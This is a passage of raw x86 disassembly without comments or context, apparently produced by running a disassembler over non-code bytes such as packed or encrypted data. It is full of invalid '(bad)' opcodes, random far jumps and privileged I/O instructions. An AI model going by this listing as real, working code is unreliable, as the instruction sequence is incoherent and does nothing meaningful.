  415388:	test   DWORD PTR [ecx+0x506c7b18],eax
  41538e:	mov    cl,BYTE PTR [edx]
  415390:	push   ebx
  415391:	lds    esp,FWORD PTR [eax+0x8]
  415394:	out    0x49,al
  415396:	sbb    cl,dh
  415398:	xlat   BYTE PTR ds:[ebx]
  415399:	loop   0x4153ba
  41539b:	int    0x1b
  41539d:	xchg   BYTE PTR [ebp-0x5b],dh
  4153a0:	jo     0x415398
  4153a2:	jne    0x415389
  4153a4:	xor    eax,0x70dbfc5d
  4153a9:	pop    esp
  4153aa:	out    dx,al
  4153ab:	pop    edx
  4153ac:	mov    ecx,0xc450044e
  4153b2:	stos   DWORD PTR es:[edi],eax
  4153b3:	xor    esi,DWORD PTR [ecx+0x2d]
  4153b6:	inc    ebp
  4153b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b8:	repnz mov WORD PTR [edi+0x25ae94cf],?
  4153bf:	test   BYTE PTR [eax],al
  4153c1:	jnp    0x4153ce
  4153c3:	or     BYTE PTR [edi-0x3575e95d],dh
  4153c9:	mov    eax,0x68774df4
  4153ce:	retf   
  4153cf:	inc    eax
  4153d0:	or     eax,0x9eee1b8e
  4153d5:	jae    0x415357
  4153d7:	inc    edi
  4153d8:	mov    bl,0x7c
  4153da:	les    edi,FWORD PTR [ecx+0x20ce3714]
  4153e0:	sbb    ecx,DWORD PTR [edi-0x77]
  4153e3:	or     BYTE PTR [esi+0x30],0xd8
  4153e7:	imul   ecx,esp,0xffffffae
  4153ea:	pop    es
  4153eb:	pop    esp
  4153ec:	jmp    0x4153d9
  4153ee:	arpl   WORD PTR [esi-0x55052f13],dx
  4153f4:	mov    al,ds:0x78eae5dc
  4153f9:	div    BYTE PTR [edx]
  4153fb:	adc    dh,ch
  4153fd:	sub    DWORD PTR [esi],esi
  4153ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415400:	add    al,0xed
  415402:	out    dx,eax
  415403:	jg     0x41544f
  415405:	and    ecx,ebp
  415407:	jb     0x4153d8
  415409:	adc    edi,DWORD PTR [esi+0x5e7439ef]
  41540f:	in     al,dx
  415410:	mov    dh,0x49
  415412:	lds    ecx,FWORD PTR [edx+0x4d]
  415415:	xchg   edx,ebx
  415417:	fnstenv [edi-0x73f012b3]
  41541d:	and    al,0xe3
  41541f:	mov    cl,BYTE PTR [edx+0xe]
  415422:	inc    eax
  415423:	fsubr  QWORD PTR [ebx+0x78]
  415426:	xlat   BYTE PTR ds:[ebx]
  415427:	mov    dl,0xe
  415429:	xlat   BYTE PTR ds:[ebx]
  41542a:	mov    edi,0xa29a1822
  41542f:	jl     0x4154a6
  415431:	lds    esp,FWORD PTR [eax-0x5c346ff3]
  415437:	clc    
  415438:	loope  0x415434
  41543a:	cmp    DWORD PTR [ebx],eax
  41543c:	sti    
  41543d:	sub    cl,BYTE PTR [esi+0x62]
  415440:	xor    edi,0x9f3f1085
  415446:	inc    esi
  415447:	pop    ss
  415448:	dec    eax
  415449:	inc    esi
  41544a:	xor    al,cl
  41544c:	retf   0x258c
  41544f:	mov    dh,0x7
  415451:	jle    0x4153d6
  415453:	rcl    DWORD PTR [ecx+0x20f89371],cl
  415459:	cmp    BYTE PTR [ebp-0x57],bl
  41545c:	int3   
  41545d:	xor    BYTE PTR [edi],0xb5
  415460:	jns    0x415437
  415462:	fmul   st,st(1)
  415464:	fdivr  QWORD PTR [ebx]
  415466:	mov    BYTE PTR [ebx],0xe8
  415469:	pop    edx
  41546a:	or     eax,0x514f8ed1
  41546f:	sar    ah,0x6
  415472:	(bad)  
  415473:	push   edx
  415474:	loopne 0x415463
  415476:	xchg   edi,eax
  415477:	arpl   WORD PTR [ebx],si
  415479:	or     eax,0x31af8c5c
  41547e:	jl     0x4154ca
  415480:	fwait
  415481:	je     0x415461
  415483:	ins    DWORD PTR es:[edi],dx
  415484:	push   ebp
  415485:	pusha  
  415486:	sbb    al,0xa5
  415488:	outs   dx,DWORD PTR ds:[esi]
  415489:	popa   
  41548a:	out    0x41,al
  41548c:	dec    ebx
  41548d:	add    al,0x64
  41548f:	scas   al,BYTE PTR es:[edi]
  415490:	sub    BYTE PTR [ebp-0x54],0x20
  415494:	retf   0xe683
  415497:	mov    ch,0xae
  415499:	clc    
  41549a:	xor    DWORD PTR [eax+0x3e],ebp
  41549d:	call   0xdb06:0x60f75b7e
  4154a4:	and    ebx,ebp
  4154a6:	mov    ch,0xdc
  4154a8:	int    0x96
  4154aa:	pop    ecx
  4154ab:	ins    DWORD PTR es:[edi],dx
  4154ac:	adc    dh,bl
  4154ae:	bswap  ebx
  4154b0:	mov    al,0x14
  4154b2:	arpl   WORD PTR [ebx+0x7a1728eb],ax
  4154b8:	cdq    
  4154b9:	xchg   edi,eax
  4154ba:	lea    eax,[esi]
  4154bc:	scas   al,BYTE PTR es:[edi]
  4154bd:	push   esi
  4154be:	(bad)  
  4154bf:	push   eax
  4154c0:	sub    eax,0x8c6ead12
  4154c5:	jb     0x415487
  4154c7:	int3   
  4154c8:	jbe    0x41545e
  4154ca:	ja     0x415547
  4154cc:	xchg   BYTE PTR [ecx+0x112cf245],cl
  4154d2:	dec    BYTE PTR [edx]
  4154d4:	ss clc 
  4154d6:	cwde   
  4154d7:	jnp    0x415465
  4154d9:	sbb    eax,0x70d4d062
  4154de:	fadd   QWORD PTR [eax-0x15]
  4154e1:	div    cl
  4154e3:	cli    
  4154e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154e5:	push   ss
  4154e6:	sub    bl,bl
  4154e8:	sbb    BYTE PTR [edi],bl
  4154ea:	arpl   WORD PTR [esp+ecx*4-0xcdcfb3a],dx
  4154f1:	mov    al,ds:0x6359c7f4
  4154f6:	dec    edi
  4154f7:	daa    
  4154f8:	sbb    al,al
  4154fa:	or     eax,0x6e5adb39
  4154ff:	and    ebp,ecx
  415501:	dec    ecx
  415502:	mov    dl,0xb4
  415504:	mov    al,0xbc
  415506:	hlt    
  415507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415508:	sahf   
  415509:	daa    
  41550a:	dec    ebp
  41550b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41550d:	in     eax,0xfb
  41550f:	cdq    
  415510:	pop    ecx
  415511:	shl    dh,0x34
  415514:	add    DWORD PTR [eax],edx
  415516:	jmp    0x450f70da
  41551b:	pop    ebp
  41551c:	cld    
  41551d:	add    DWORD PTR [esp+esi*4-0x7a88b2d8],ecx
  415524:	and    al,0x76
  415526:	test   BYTE PTR [ebp+0x7f321efc],dh
  41552c:	cmp    dl,dh
  41552e:	cmp    bl,ah
  415530:	push   ecx
  415531:	jge    0x4154fd
  415533:	popa   
  415534:	sub    dl,BYTE PTR [edx+0x6875f9b8]
  41553a:	scas   al,BYTE PTR es:[edi]
  41553b:	rcr    dl,cl
  41553d:	push   edx
  41553e:	pop    esp
  41553f:	or     edx,ecx
  415541:	fwait
  415542:	dec    ebx
  415543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415544:	inc    edx
  415545:	stos   DWORD PTR es:[di],eax
  415547:	xchg   ebp,eax
  415548:	mov    cl,0x15
  41554a:	dec    edi
  41554b:	out    0x62,eax
  41554d:	jecxz  0x415591
  41554f:	xor    DWORD PTR [edi+0x1a107e98],0xffffffe4
  415556:	cdq    
  415557:	imul   eax,DWORD PTR [esi+0x27],0xd899dc9
  41555e:	jmp    0x119b:0x296eba4
  415565:	mov    edx,0x8688825a
  41556a:	and    DWORD PTR [edx-0x5c455780],0xffffffd0
  415571:	shr    DWORD PTR [esi+0x43],0x79
  415575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415576:	pop    ebx
  415577:	adc    bl,BYTE PTR [ecx-0x66]
  41557a:	inc    eax
  41557b:	pop    edx
  41557c:	mov    al,ds:0x52484582
  415581:	int3   
  415582:	add    cl,bh
  415584:	int3   
  415585:	or     eax,0xe3c19586
  41558a:	mov    eax,ds:0xc6e1f2ce
  41558f:	ins    BYTE PTR es:[edi],dx
  415590:	cli    
  415591:	xchg   edi,ebx
  415593:	call   0x49f9:0x8d31db81
  41559a:	int    0x4d
  41559c:	into   
  41559d:	das    
  41559e:	loopne 0x41557c
  4155a0:	push   ecx
  4155a1:	iret   
  4155a2:	add    bl,BYTE PTR [ecx-0x3d33c615]
  4155a8:	inc    ebp
  4155a9:	int    0x59
  4155ab:	mov    bl,0xab
  4155ad:	cmp    eax,0x7e5cf07e
  4155b2:	retf   
  4155b3:	cmc    
  4155b4:	out    0x52,eax
  4155b6:	jp     0x415628
  4155b8:	aad    0x92
  4155ba:	sti    
  4155bb:	mov    edx,0x2404a1b0
  4155c0:	scas   eax,DWORD PTR es:[edi]
  4155c1:	inc    edi
  4155c2:	gs inc ebp
  4155c4:	jae    0x415546
  4155c6:	jmp    0x8ab9:0x4dca22e2
  4155cd:	stos   BYTE PTR es:[edi],al
  4155ce:	ss pop eax
  4155d0:	aam    0xc1
  4155d2:	add    bl,BYTE PTR [edx-0x44]
  4155d5:	enter  0x6f1d,0x12
  4155d9:	fld    st(7)
  4155db:	test   BYTE PTR [edx+edi*4+0xe59b6b9],ah
  4155e2:	inc    edi
  4155e3:	dec    eax
  4155e4:	arpl   bp,cx
  4155e6:	add    eax,0x24b3d697
  4155eb:	fs jbe 0x415628
  4155ee:	mov    esp,DWORD PTR [edx-0x47361c7e]
  4155f4:	in     al,0x45
  4155f6:	sbb    dl,dl
  4155f8:	lods   al,BYTE PTR ds:[esi]
  4155f9:	dec    ecx
  4155fa:	mov    bl,0xc1
  4155fc:	fldcw  WORD PTR [esi]
  4155fe:	les    ebx,FWORD PTR [ebx+0x4f12b541]
  415604:	jg     0x4155c7
  415606:	les    ecx,FWORD PTR [edx+esi*8]
  415609:	sahf   
  41560a:	push   es
  41560b:	xchg   ebx,ecx
  41560d:	xlat   BYTE PTR ds:[ebx]
  41560e:	pop    ecx
  41560f:	sub    bh,BYTE PTR [esi]
  415611:	shl    DWORD PTR [edi+0x31f3baf5],1
  415617:	(bad)  
  415618:	(bad)  
  415619:	loopne 0x415691
  41561b:	in     eax,dx
  41561c:	cli    
  41561d:	outs   dx,DWORD PTR ds:[esi]
  41561e:	pop    esp
  41561f:	jno    0x41568a
  415621:	xor    al,cl
  415623:	jl     0x4155db
  415625:	xlat   BYTE PTR ds:[ebx]
  415626:	cld    
  415627:	ss add al,0x86
  41562a:	mov    al,0x7
  41562c:	mov    bh,dl
  41562e:	mov    dh,0xa7
  415630:	mov    dh,0x74
  415632:	jmp    0xf0cd:0x640eff9e
  415639:	ret    0xe302
  41563c:	cmp    edx,edi
  41563e:	std    
  41563f:	fisttp DWORD PTR [edi+0x6c84e68]
  415645:	or     ecx,DWORD PTR [eax-0x48]
  415648:	cmp    eax,0x7b3024f0
  41564d:	mov    eax,ds:0xf0511445
  415652:	push   ebp
  415653:	mov    al,BYTE PTR [edi]
  415655:	rcl    DWORD PTR [esi+0x7a],cl
  415658:	xor    dh,BYTE PTR [ecx-0x55]
  41565b:	and    dh,dh
  41565d:	(bad)  
  41565e:	shr    DWORD PTR [eax],1
  415660:	xor    eax,0x808b1f0d
  415665:	and    bl,BYTE PTR [eax+0x3cc0d57f]
  41566b:	pop    ss
  41566c:	mov    edi,0xeaffd51a
  415671:	outs   dx,DWORD PTR ds:[esi]
  415672:	push   0x2b2744d0
  415677:	clc    
  415678:	es test eax,0x93a25f37
  41567e:	jmp    0x215f:0x7851aa73
  415685:	mov    ebp,0xd4872b6
  41568a:	push   ebx
  41568b:	jne    0x415623
  41568d:	xchg   esp,eax
  41568e:	pop    ebx
  41568f:	call   0x9abd2695
  415694:	shr    BYTE PTR [ebx+edi*8+0x17],0xa2
  415699:	fcom   QWORD PTR [ebp+0x4c0e5cc1]
  41569f:	mov    dh,0xe1
  4156a1:	ds (bad) 
  4156a3:	loope  0x41570e
  4156a5:	pop    ds
  4156a6:	mov    cl,0x8e
  4156a8:	push   ebp
  4156a9:	ss out 0xf9,al
  4156ac:	pushf  
  4156ad:	hlt    
  4156ae:	or     eax,0xa764e014
  4156b3:	sub    DWORD PTR [edi+0x45],esi
  4156b6:	push   ecx
  4156b7:	fmul   QWORD PTR [ebx+0x11]
  4156ba:	ins    BYTE PTR es:[edi],dx
  4156bb:	add    BYTE PTR [edi],0xc8
  4156be:	lahf   
  4156bf:	in     eax,0xf6
  4156c1:	and    ebp,DWORD PTR [eax]
  4156c3:	mov    ds:0x654e9e8f,al
  4156c8:	or     al,0xc2
  4156ca:	cmc    
  4156cb:	jecxz  0x415692
  4156cd:	loopne 0x41574b
  4156cf:	pushf  
  4156d0:	pop    esp
  4156d1:	aaa    
  4156d2:	mov    ds:0xecab39d2,al
  4156d7:	lods   al,BYTE PTR ds:[esi]
  4156d8:	loopne 0x415696
  4156da:	data16 scas al,BYTE PTR es:[edi]
  4156dc:	icebp  
  4156dd:	popf   
  4156de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156df:	mov    dh,0xe
  4156e1:	or     eax,0xb806df4
  4156e6:	pop    es
  4156e7:	jno    0x4156a8
  4156e9:	lahf   
  4156ea:	push   0xffffff8b
  4156ec:	dec    edx
  4156ed:	inc    esp
  4156ee:	and    bl,BYTE PTR [eax+0x21]
  4156f1:	or     al,0x1b
  4156f3:	mov    dh,BYTE PTR [edi]
  4156f5:	jae    0x41571a
  4156f7:	daa    
  4156f8:	test   al,0xe0
  4156fa:	and    eax,0x3b55f327
  4156ff:	out    0x43,al
  415701:	icebp  
  415702:	leave  
  415703:	inc    edx
  415704:	xchg   ebx,eax
  415705:	je     0x4156c3
  415707:	mov    esi,DWORD PTR [eax*2-0x1d440c9e]
  41570e:	out    0x2d,al
  415710:	retf   0x56d2
  415713:	ja     0x415704
  415715:	icebp  
  415716:	nop
  415717:	cs jle 0x4156d8
  41571a:	jne    0x4156c8
  41571c:	adc    edx,DWORD PTR [eax+0x23a6b99b]
  415722:	mov    ebx,0x9f25d311
  415727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415728:	xor    dl,BYTE PTR [ebx-0x13]
  41572b:	retf   
  41572c:	mov    al,ds:0x1a4cc694
  415731:	sbb    eax,0x4617f69
  415736:	test   eax,0x1405212b
  41573b:	rol    BYTE PTR [ebx],0xd9
  41573e:	pop    edx
  41573f:	or     ah,dl
  415741:	inc    esi
  415742:	loope  0x41572a
  415744:	push   eax
  415745:	pop    ebp
  415746:	xchg   ebx,eax
  415747:	call   0x2c96b805
  41574c:	pop    ds
  41574d:	inc    esp
  41574e:	and    eax,0x5b8970e6
  415753:	icebp  
  415754:	out    0x25,al
  415756:	push   ecx
  415757:	cmp    BYTE PTR [ecx],bh
  415759:	mov    ds:0x15133bde,eax
  41575e:	out    dx,eax
  41575f:	mov    esp,0x1971788d
  415764:	mul    ebp
  415766:	jecxz  0x41573e
  415768:	and    cl,BYTE PTR [eax+ebx*4-0x51]
  41576c:	out    dx,eax
  41576d:	xlat   BYTE PTR ds:[ebx]
  41576e:	out    dx,al
  41576f:	(bad)  [edx-0x5eb87a63]
  415775:	pmulhw mm2,QWORD PTR [edx]
  415778:	xchg   esp,eax
  415779:	cmp    ecx,DWORD PTR [ebp+0x2d]
  41577c:	or     ecx,DWORD PTR [ecx+0x8]
  41577f:	idiv   ah
  415781:	jg     0x415720
  415783:	rcr    DWORD PTR [ebx+ebp*1-0x166a9314],cl
  41578a:	in     al,0x95
  41578c:	xor    BYTE PTR [eax],bh
  41578e:	mov    dh,BYTE PTR [esi-0x2dec7b17]
  415794:	and    BYTE PTR [ebx-0x50],dl
  415797:	scas   eax,DWORD PTR es:[edi]
  415798:	test   eax,0x5ee2dab3
  41579d:	sbb    eax,0x19fc8869
  4157a2:	mov    edx,0xa5563d54
  4157a7:	je     0x41580a
  4157a9:	dec    esp
  4157aa:	or     bl,ch
  4157ac:	lods   al,BYTE PTR ds:[esi]
  4157ad:	mov    ch,0x8e
  4157af:	jle    0x41580c
  4157b1:	ret    
  4157b2:	das    
  4157b3:	int3   
  4157b4:	ins    BYTE PTR es:[edi],dx
  4157b5:	push   es
  4157b6:	(bad)  
  4157b7:	iret   
  4157b8:	mov    ebx,DWORD PTR [edi]
  4157ba:	or     DWORD PTR [edx-0x1b95026c],esi
  4157c0:	mov    cl,0xef
  4157c2:	adc    esi,ebp
  4157c4:	xor    BYTE PTR [ebp+0x53e679b0],dl
  4157ca:	imul   ecx,edx,0xffffffb0
  4157cd:	mov    dh,0xd5
  4157cf:	fistp  DWORD PTR [edx]
  4157d1:	je     0x4157cd
  4157d3:	pop    esi
  4157d4:	push   ecx
  4157d5:	adc    DWORD PTR [ebx],esi
  4157d7:	lea    ecx,[esp+edi*8]
  4157da:	rcr    DWORD PTR [esi-0x13],0xf3
  4157de:	retf   0xb2c3
  4157e1:	add    DWORD PTR [ecx+0x34],ebx
  4157e4:	jns    0x415833
  4157e6:	pop    ecx
  4157e7:	push   esp
  4157e8:	aam    0x90
  4157ea:	mov    ds:0x78f9a7f7,al
  4157ef:	adc    BYTE PTR ds:0x68074633,cl
  4157f5:	push   ss
  4157f6:	jnp    0x4157ae
  4157f8:	adc    BYTE PTR [ebp-0x404beb8d],ch
  4157fe:	mov    al,ds:0xcb47d66
  415803:	pop    ebx
  415804:	(bad)  
  415805:	faddp  st(5),st
  415807:	int3   
  415808:	or     cl,BYTE PTR [esi]
  41580a:	fidiv  DWORD PTR [edi+0x757523e5]
  415810:	fdiv   QWORD PTR [edi+ebx*4]
  415813:	aas    
  415814:	cmp    DWORD PTR [esi],edx
  415816:	in     al,0x3a
  415818:	jecxz  0x4157e8
  41581a:	mov    BYTE PTR [edi+0x40e47b1b],cl
  415820:	add    al,0xb0
  415822:	cmp    esp,edi
  415824:	aaa    
  415825:	cwde   
  415826:	scas   eax,DWORD PTR es:[edi]
  415827:	cmc    
  415828:	addr16 jne 0x415860
  41582b:	xor    esi,DWORD PTR [ecx+0x5253fb57]
  415831:	push   ds
  415832:	mov    bh,0xd4
  415834:	mov    cl,0xff
  415836:	clc    
  415837:	in     al,0x3e
  415839:	or     dl,dl
  41583b:	pop    esi
  41583c:	aam    0x7c
  41583e:	das    
  41583f:	fiadd  DWORD PTR [esi-0x5a]
  415842:	aas    
  415843:	mov    ds:0xafee0802,al
  415848:	mov    edi,0x8e03df99
  41584d:	add    DWORD PTR [esi-0x1bc77737],eax
  415853:	sbb    al,0x5b
  415855:	sbb    dh,BYTE PTR [ebx+0x3f8b387f]
  41585b:	mov    al,0xd2
  41585d:	scas   al,BYTE PTR es:[edi]
  41585e:	imul   edi,DWORD PTR [esi-0x571453e1],0x4a
  415865:	cli    
  415866:	dec    ebx
  415867:	mov    esi,0x2278558
  41586c:	pusha  
  41586d:	loope  0x41589d
  41586f:	call   0x8c41ab7b
  415874:	lods   eax,DWORD PTR es:[esi]
  415876:	xchg   dl,dl
  415878:	lods   eax,DWORD PTR ds:[esi]
  415879:	and    bh,BYTE PTR [ebp-0x73]
  41587c:	xchg   ecx,eax
  41587d:	ss ds out dx,eax
  415880:	pop    ds
  415881:	cwde   
  415882:	sub    BYTE PTR [edx],bh
  415884:	in     eax,dx
  415885:	mov    DWORD PTR [ebp-0x3eccf48f],edx
  41588b:	cmp    esi,ebx
  41588d:	das    
  41588e:	or     eax,0x42a3627b
  415893:	fldlg2 
  415895:	arpl   WORD PTR [edx+0x637160f5],sp
  41589b:	adc    al,ch
  41589d:	pusha  
  41589e:	add    DWORD PTR [ecx+0x2c],eax
  4158a1:	in     al,0x12
  4158a3:	mov    eax,ds:0x4f0f107a
  4158a8:	or     ch,BYTE PTR [edi-0x4e]
  4158ab:	push   ss
  4158ac:	pop    ebp
  4158ad:	(bad)  
  4158ae:	mov    bl,0xcb
  4158b0:	xor    DWORD PTR [edi+0x6d58047a],esi
  4158b6:	xlat   BYTE PTR ss:[ebx]
  4158b8:	ss inc ebp
  4158ba:	sub    al,0x6d
  4158bc:	adc    ecx,ecx
  4158be:	cmp    eax,0x9797a8af
  4158c3:	mov    al,ds:0x403bad5
  4158c8:	fwait
  4158c9:	sbb    eax,DWORD PTR [esi-0x47]
  4158cc:	jae    0x4158b5
  4158ce:	sbb    eax,0x567c4331
  4158d3:	jge    0x4158a3
  4158d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d6:	fsub   QWORD PTR [edx-0x53]
  4158d9:	test   BYTE PTR [edi+0x333c4f9a],dh
  4158df:	cdq    
  4158e0:	cmp    DWORD PTR [ecx],edx
  4158e2:	and    cl,bl
  4158e4:	adc    BYTE PTR [ecx],dl
  4158e6:	les    esi,FWORD PTR [esi-0x6705ee01]
  4158ec:	dec    esp
  4158ed:	iret   
  4158ee:	jbe    0x4158f1
  4158f0:	mov    al,0x5
  4158f2:	and    DWORD PTR [edi-0x6a],edx
  4158f5:	push   edi
  4158f6:	idiv   DWORD PTR [edi+0x3b84e749]
  4158fc:	inc    ebp
  4158fd:	stos   BYTE PTR es:[edi],al
  4158fe:	je     0x4158a8
  415900:	jo     0x41588c
  415902:	out    0x2e,eax
  415904:	or     ebp,DWORD PTR ds:0x5af88858
  41590a:	dec    edi
  41590b:	dec    eax
  41590c:	mov    esi,0xea1563e
  415911:	shl    edi,1
  415913:	out    0x7b,al
  415915:	call   0xe12d:0xf113822d
  41591c:	out    0x8a,eax
  41591e:	gs jne 0x4158f0
  415921:	inc    eax
  415922:	in     eax,dx
  415923:	mov    DWORD PTR [ecx+0x5c2f0382],esi
  415929:	inc    eax
  41592a:	adc    BYTE PTR [eax],0xf
  41592d:	ret    0x29bb
  415930:	xchg   ecx,eax
  415931:	sub    al,0xd5
  415933:	mov    cl,bh
  415935:	icebp  
  415936:	inc    ebp
  415937:	mov    ds:0x4489dd49,al
  41593c:	(bad)  
  41593d:	fldcw  WORD PTR [edi]
  41593f:	adc    edi,eax
  415941:	ins    DWORD PTR es:[edi],dx
  415942:	jmp    0x74df:0x20df567c
  415949:	cmp    al,0xac
  41594b:	cmp    eax,0xbb2c8166
  415950:	dec    esp
  415951:	rcl    DWORD PTR [ebp+0x3d],0x23
  415955:	mov    esp,0x9cdce9ff
  41595a:	arpl   WORD PTR [ebp-0x34af9b04],sp
  415960:	xor    DWORD PTR [eax],0x1b
  415963:	(bad)  
  415964:	pop    ecx
  415965:	test   al,0xfa
  415967:	inc    esp
  415968:	jae    0x41597d
  41596a:	cmp    dh,BYTE PTR [edx-0x78f7c]
  415970:	cmp    eax,0xff0a9bfd
  415975:	arpl   WORD PTR [ebp+0x7cd4297f],ax
  41597b:	sub    edi,ebp
  41597d:	xlat   BYTE PTR ds:[ebx]
  41597e:	shl    BYTE PTR [ebx+0x667ec50b],1
  415984:	push   esi
  415985:	sbb    bh,BYTE PTR [edx]
  415987:	fild   QWORD PTR [ebx-0x37]
  41598a:	mov    ds:0xbc505f75,eax
  41598f:	enter  0x3500,0xa4
  415993:	push   esp
  415994:	cdq    
  415995:	dec    edx
  415996:	je     0x415957
  415998:	jne    0x4159e8
  41599a:	xor    cl,bh
  41599c:	fdivr  st(7),st
  41599e:	and    ebx,edx
  4159a0:	mov    ah,0x3a
  4159a2:	fsub   DWORD PTR [ecx]
  4159a4:	xor    eax,ebp
  4159a6:	jp     0x415993
  4159a8:	xchg   ebp,eax
  4159a9:	out    0x2e,al
  4159ab:	dec    esi
  4159ac:	lahf   
  4159ad:	sbb    DWORD PTR [edx+eax*4],ebx
  4159b0:	jmp    0x2a772c73
  4159b5:	mov    eax,ds:0x5e08beed
  4159ba:	popf   
  4159bb:	cmp    eax,0x6ba8f775
  4159c0:	loopne 0x415978
  4159c2:	cld    
  4159c3:	xchg   ebp,eax
  4159c4:	push   edi
  4159c5:	adc    DWORD PTR [edx-0x49],eax
  4159c8:	into   
  4159c9:	or     bh,0x89
  4159cc:	cmc    
  4159cd:	inc    eax
  4159ce:	pop    esi
  4159cf:	lock jle 0x415a3c
  4159d2:	sub    BYTE PTR [eax-0x49],0xc4
  4159d6:	aad    0x1a
  4159d8:	enter  0xf961,0xc2
  4159dc:	(bad)  
  4159dd:	(bad)  
  4159df:	pop    eax
  4159e0:	sub    al,0x71
  4159e2:	scas   al,BYTE PTR es:[edi]
  4159e3:	fwait
  4159e4:	jp     0x4159a5
  4159e6:	push   cs
  4159e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e8:	mov    bl,0x77
  4159ea:	pop    esp
  4159eb:	jae    0x41599e
  4159ed:	mov    ecx,0xa1733a09
  4159f2:	mov    al,ds:0xb52cf0df
  4159f7:	push   ecx
  4159f8:	ins    DWORD PTR es:[edi],dx
  4159f9:	dec    edx
  4159fa:	std    
  4159fb:	sbb    BYTE PTR [esi+0x64],0x4c
  4159ff:	and    bl,dh
  415a01:	fld    DWORD PTR [edx]
  415a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a04:	std    
  415a05:	das    
  415a06:	dec    esi
  415a07:	mov    BYTE PTR [eax+0x4a],cl
  415a0a:	adc    BYTE PTR [eax*4+0x154112b9],cl
  415a11:	repz mov ch,0x29
  415a14:	xchg   esi,eax
  415a15:	and    ebp,edi
  415a17:	test   eax,0xd423deb8
  415a1c:	out    dx,ax
  415a1e:	jae    0x415a62
  415a20:	or     eax,0xbed642b7
  415a25:	rcl    BYTE PTR [esi+0x3b],cl
  415a28:	rol    ebx,0xba
  415a2b:	popf   
  415a2c:	scas   al,BYTE PTR es:[edi]
  415a2d:	pop    edi
  415a2e:	stos   DWORD PTR es:[edi],eax
  415a2f:	pop    ecx
  415a30:	mov    dh,BYTE PTR [ebp+0x5885b8bb]
  415a36:	ss jge 0x415a3b
  415a39:	(bad)  
  415a3c:	dec    edi
  415a3d:	fimul  DWORD PTR [eax+0x58]
  415a40:	dec    edx
  415a41:	(bad)  
  415a44:	aaa    
  415a45:	pop    ds
  415a46:	pop    es
  415a47:	sbb    al,0xde
  415a49:	and    edi,DWORD PTR [ebx+0x62e57df0]
  415a4f:	xchg   edi,eax
  415a50:	add    DWORD PTR [eax-0x3d],ebx
  415a53:	or     BYTE PTR [esi+0x42b137c1],bl
  415a59:	pop    ds
  415a5a:	loop   0x415a65
  415a5c:	add    DWORD PTR [edi],ebx
  415a5e:	jmp    0x3b3c:0xb5b6d9e8
  415a65:	fwait
  415a66:	sbb    esi,0xce3f1862
  415a6c:	sub    BYTE PTR [esi],ah
  415a6e:	adc    edx,0x15e44f93
  415a74:	add    eax,0x65c8aab7
  415a79:	ror    DWORD PTR [bx+di-0x72b3],0xe9
  415a7f:	adc    DWORD PTR ds:0x9f536252,ebx
  415a85:	xor    BYTE PTR [ebp+0x48],dl
  415a88:	mov    eax,ds:0xf7476ecb
  415a8d:	push   eax
  415a8e:	pop    ecx
  415a8f:	push   esp
  415a90:	scas   al,BYTE PTR es:[edi]
  415a91:	shl    DWORD PTR [ebp+0x4d08230],0x1a
  415a98:	test   al,cl
  415a9a:	popa   
  415a9b:	ret    0xb390
  415a9e:	aaa    
  415a9f:	mov    BYTE PTR [edi+0x6ac4c9b4],ch
  415aa5:	or     dh,BYTE PTR [edi]
  415aa7:	gs sbb bl,ah
  415aaa:	jb     0x415abe
  415aac:	cmp    esp,DWORD PTR [ebx]
  415aae:	fldenv [edx-0x6]
  415ab1:	stos   DWORD PTR es:[edi],eax
  415ab2:	jg     0x415b00
  415ab4:	dec    esp
  415ab5:	xchg   bx,ax
  415ab7:	xchg   ecx,eax
  415ab8:	aad    0xc2
  415aba:	mov    ds:0x302f6c18,al
  415abf:	mov    cl,0xdd
  415ac1:	bound  ebp,QWORD PTR [bp+si-0x6]
  415ac5:	and    DWORD PTR ds:0xea1a3c05,edi
  415acb:	scas   eax,DWORD PTR es:[edi]
  415acc:	aam    0xb1
  415ace:	bndldx (bad),[ecx+0xf]
  415ad2:	jmp    0x415acb
  415ad4:	pop    esi
  415ad5:	dec    esi
  415ad6:	stc    
  415ad7:	cdq    
  415ad8:	or     esp,DWORD PTR [ebp+0x9]
  415adb:	repz jmp 0xf3ac:0xe57d74d0
  415ae3:	jno    0x415b61
  415ae5:	or     edi,DWORD PTR [edx+0x43]
  415ae8:	pop    edx
  415ae9:	arpl   WORD PTR ds:0x26cf3232,sp
  415aef:	test   BYTE PTR [esi-0x6e],cl
  415af2:	mov    dl,0x1a
  415af4:	repz or eax,0x6cfd8ea4
  415afa:	cld    
  415afb:	sbb    ebp,0x7fb0044
  415b01:	(bad)  
  415b02:	cld    
  415b03:	pushf  
  415b04:	push   cs
  415b05:	leave  
  415b06:	cmp    eax,DWORD PTR [ebp+0x6da96c39]
  415b0c:	jp     0x415a99
  415b0e:	jnp    0x415b5a
  415b10:	and    al,0x2c
  415b12:	fwait
  415b13:	push   0x6173b0d3
  415b18:	sbb    BYTE PTR [ecx-0xeb53509],cl
  415b1e:	xchg   edx,eax
  415b1f:	(bad)  
  415b20:	cmp    al,0x6b
  415b22:	pop    ds
  415b23:	adc    ebx,DWORD PTR [esi]
  415b25:	mov    dl,0x36
  415b27:	and    al,al
  415b29:	dec    ebp
  415b2a:	ror    DWORD PTR [eax+0x32],0x35
  415b2e:	lods   eax,DWORD PTR ds:[esi]
  415b2f:	push   ebp
  415b30:	div    BYTE PTR [ebx-0x348babb4]
  415b36:	adc    ebp,DWORD PTR [ecx+esi*4+0x7a]
  415b3a:	call   0xaa60a94e
  415b3f:	ror    edx,0x8a
  415b42:	inc    ecx
  415b43:	cmp    eax,DWORD PTR [ecx+0x1c2730bf]
  415b49:	sbb    al,0x1a
  415b4b:	inc    edx
  415b4c:	sbb    cl,dl
  415b4e:	pop    ds
  415b4f:	xchg   esp,eax
  415b50:	es inc ecx
  415b52:	jp     0x415b77
  415b54:	retf   
